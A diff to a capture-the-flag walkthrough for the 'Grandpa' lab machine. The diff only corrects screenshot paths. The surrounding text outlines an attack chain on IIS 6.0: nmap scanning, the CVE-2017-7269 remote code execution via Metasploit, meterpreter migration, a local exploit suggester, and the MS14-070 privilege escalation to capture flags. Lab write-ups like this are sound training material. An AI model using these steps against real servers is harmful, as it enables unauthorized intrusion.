@@ -17,7 +17,7 @@ nmap -sV -sC -oA nmap/grandpa 10.10.10.14
 
 ###### Output 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/nmap.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/nmap.png)
 
 ```sh
 nmap -sV -sC -oA nmap/grandpa 10.10.10.14                                                                                         ─╯
@@ -49,7 +49,7 @@ port[80]-  httpd 2.4.18
 
 when we naviagate to [http://10.10.10.14](http://10.10.10.14)  we find a page that say it under construction 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/under.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/under.png)
 
 so we know the machine version so what we are going to do is to search for the exploit 
 
@@ -57,11 +57,11 @@ so we know the machine version so what we are going to do is to search for the e
 searchsploit Microsoft IIS 6.0 
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/searchsploit.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/searchsploit.png)
 
 Some searching reveals a remote code execution vulnerability (CVE-2017-7269). There is a proof of concept that requires some modification, as well as a Metasploit module. Lets examine the Remote Buffer Overflow
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/py.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/py.png)
 
 After Examining the exploit we now Import it to our working directory.
 
@@ -77,21 +77,21 @@ set LHOST 10.10.14.15
 run
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/shell.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/shell.png)
 
 now that the meterpreter is refusing to get some infomation we just load the shell and do a `systeminfo` so that we can be able to see if their are hot fixes 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/systeminfo.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/systeminfo.png)
 
 we find that their is only one hotfix that is done
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/hotfix.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/hotfix.png)
 
 we noticed that it running a 32 bit meterpreter so lets migrate to a 32 bit meterpreter with `NT Authority` and be able to run a `local suggester`
 
 After migrating we can now be able to run `sysinfo`
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/sysinfo.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/sysinfo.png)
 
 now i run suggester to find exploits which are vulnerable
 
@@ -102,11 +102,11 @@ search local_exploit_suggester
 use multi/recon/local_exploit_suggester
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/suggester.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/suggester.png)
 
 looking at the results we find that their are a couple of exploits 
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/exploits.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/exploits.png)
 
 In this case lets try this exploit `exploit/windows/local/ms14_070_tcpip_ioctl`
 
@@ -114,19 +114,19 @@ In this case lets try this exploit `exploit/windows/local/ms14_070_tcpip_ioctl`
 use exploit/windows/local/ms14_070_tcpip_ioctl
 ```
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/shell2.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/shell2.png)
 
 and just that way we get shell
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/shellroot.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/shellroot.png)
 
 we can get the user flag from `C:\Documents and Settings\Harry\Desktop`
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/userflag.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/userflag.png)
 
 we can get the root flag from `C:\Documents and Settings\Administrator\Desktop\root.txt`
 
-![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Grandpa/Screenshots/rootflag.png)
+![](/Windows/Windows-Easy/Grandpa/Screenshots/rootflag.png)
 
 	-------------------------END successful attack @lesley----------------------
 
